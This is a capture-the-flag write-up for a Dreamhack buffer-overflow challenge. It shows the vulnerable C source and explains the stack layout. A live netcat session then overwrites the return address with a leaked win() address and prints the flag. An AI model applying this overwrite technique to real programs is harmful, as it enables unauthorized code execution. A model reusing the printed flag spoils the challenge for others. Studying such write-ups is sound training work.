### Overview 
First of all, let's checksec this file:
```
$ checksec baby-bof
[*] '/home/khanh/Documents/PWN-dreamhack/baby_bof/deploy/baby-bof'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Luckily, this challenge dont have Canary. Now, let's take a look at the source code:
````c
void win () 
{
  char flag[100] = {0,};
  int fd;
  puts ("You mustn't be here! It's a vulnerability!");

  fd = open ("./flag", O_RDONLY);
  read(fd, flag, 0x60);
  puts(flag);
  exit(0);
}

long count;
long value;
long idx = 0;
int main ()
{
  char name[16];

  // don't care this init function
  proc_init (); 

  printf ("the main function doesn't call win function (0x%lx)!\n", win); //address: 0x40125b

  printf ("name: ");
  scanf ("%15s", name);

  printf ("GM GA GE GV %s!!\n: ", name);

  printf ("|  addr\t\t|  value\t\t|\n");
  for (idx = 0; idx < 0x10; idx++) {
    printf ("|  %lx\t|  %16lx\t|\n", name + idx *8, *(long*)(name + idx*8));
  }

  printf ("hex value: ");
  scanf ("%lx%c", &value);

  printf ("integer count: ");
  scanf ("%d%c", &count);


  for (idx = 0; idx < count; idx++) {
    *(long*)(name+idx*8) = value;
  }

  
  printf ("|  addr\t\t|  value\t\t|\n");
  for (idx = 0; idx < 0x10; idx++) {
    printf ("|  %lx\t|  %16lx\t|\n", name + idx *8, *(long*)(name + idx*8));
  }

  return 0;
}

````
We can see that there are 2 function main() and win().
And for sure, our goal is how to call win() function by buffer overflow vulnerability.
And the program leak the win() address by this line:

``
printf ("the main function doesn't call win function (0x%lx)!\n", win);
``
That's cool. 
### Exploitation
Analyze the code a little bit, there are some crazy stuffs there:
```c
printf ("hex value: ");
  scanf ("%lx%c", &value);

  printf ("integer count: ");
  scanf ("%d%c", &count);


  for (idx = 0; idx < count; idx++) {
    *(long*)(name+idx*8) = value;
  }

```
We can see that it will take our input to `$count $value` and override the next `8*count` bytes by the value of `$value` from the beginning of `name` variabble.
It means that the value when we input for `name` variable is not valuable. And the idea is that override all bytes by `win() address`

We know that the `name` has 16 bytes long on the stack, and then 8 bytes `saved rbp` and 8 bytes `return address`

Thus, from `name` variable, we need override total 32 bytes. And each iteration override 8 bytes, so we need `count=4` to solve this challenge
```
khanh@ubuntu:~/Documents/PWN-dreamhack/baby_bof/deploy$ nc host3.dreamhack.games 14551
the main function doesn't call win function (0x40125b)!
name: bof
GM GA GE GV bof!!
: |  addr               |  value                |
|  7fff62380830 |            666f62     |
|  7fff62380838 |            401110     |
|  7fff62380840 |                 1     |
|  7fff62380848 |      7f42fa4c0d90     |
|  7fff62380850 |                 0     |
|  7fff62380858 |            401325     |
|  7fff62380860 |         162380940     |
|  7fff62380868 |      7fff62380958     |
|  7fff62380870 |                 0     |
|  7fff62380878 |  d0de44dac10d0fa0     |
|  7fff62380880 |      7fff62380958     |
|  7fff62380888 |            401325     |
|  7fff62380890 |            403e18     |
|  7fff62380898 |      7f42fa6fd040     |
|  7fff623808a0 |  2f2080aad1af0fa0     |
|  7fff623808a8 |  2e5bb042db870fa0     |
hex value: 0x40125b
integer count: 4
|  addr         |  value                |
|  7fff62380830 |            40125b     |
|  7fff62380838 |            40125b     |
|  7fff62380840 |            40125b     |
|  7fff62380848 |            40125b     |
|  7fff62380850 |                 0     |
|  7fff62380858 |            401325     |
|  7fff62380860 |         162380940     |
|  7fff62380868 |      7fff62380958     |
|  7fff62380870 |                 0     |
|  7fff62380878 |  d0de44dac10d0fa0     |
|  7fff62380880 |      7fff62380958     |
|  7fff62380888 |            401325     |
|  7fff62380890 |            403e18     |
|  7fff62380898 |      7f42fa6fd040     |
|  7fff623808a0 |  2f2080aad1af0fa0     |
|  7fff623808a8 |  2e5bb042db870fa0     |
You mustn't be here! It's a vulnerability!
DH{62228e6f20a8b71372f0eceb51537c7f94b8191651ea0636ed4e48857c5b340c}

```